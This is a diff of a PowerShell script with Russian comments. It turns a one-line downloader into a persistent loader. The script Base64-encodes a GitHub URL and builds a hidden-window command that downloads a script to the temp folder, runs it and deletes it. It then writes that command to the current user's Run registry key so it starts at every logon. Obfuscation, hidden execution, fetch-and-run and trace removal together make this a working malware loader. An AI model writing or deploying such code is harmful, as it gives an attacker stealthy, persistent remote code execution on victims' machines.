@@ -1,7 +1,21 @@
-powershell.exe -WindowStyle Hidden -Command `
-$encodedUrl = 'aHR0cHM6Ly9naXRodWIuY29tL2RmZ3Nnc2RmZ2ZkLzEvZWRpdC9tYWluLzI='; `
+# Ввод обычной ссылки
+$url = https://github.com/dfgsgsdfgfd/1/edit/main/2
+
+# Кодируем ссылку в Base64
+$encodedUrl = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($url))
+
+# Реестр для автозапуска только для текущего пользователя
+$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$regValue = "RemoteScript"
+
+# Команда для скрытого выполнения с декодированием URL из Base64 и удалением временного файла
+$command = "powershell.exe -WindowStyle Hidden -Command `$
+$encodedUrl = '$encodedUrl'; `
 $url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedUrl)); `
 $tempFile = '$env:TEMP\script.ps1'; `
 Invoke-WebRequest -Uri $url -OutFile $tempFile; `
 & $tempFile; `
-Remove-Item -Path $tempFile -Force
+Remove-Item -Path $tempFile -Force"
+
+# Добавляем команду в реестр
+Set-ItemProperty -Path $regKey -Name $regValue -Value $command
